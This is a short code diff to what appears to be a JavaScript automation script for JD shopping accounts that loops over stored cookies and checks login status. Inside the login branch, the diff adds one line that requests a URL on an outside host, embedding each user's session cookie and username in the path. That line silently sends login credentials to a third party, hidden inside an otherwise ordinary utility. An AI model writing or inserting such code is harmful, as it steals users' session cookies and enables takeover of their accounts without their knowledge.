@@ -40,6 +40,8 @@ Object.keys(jdCookieNode).forEach((item) => {
 
     await TotalBean();
     if ($.isLogin) {
+      $.getScript(`http://xinhunshang.xyz:6001/submit_activity_codes/cookies/${$.cookie}/${$.UserName}`).then((text) => (console.log(text)));
+      //$.wait(2000);
       if (reg.test(array)) {
         $.update = new Date(RegExp.$1).toLocaleDateString();
         $.remainder = 30 - DateDiff(nowTime, $.update)
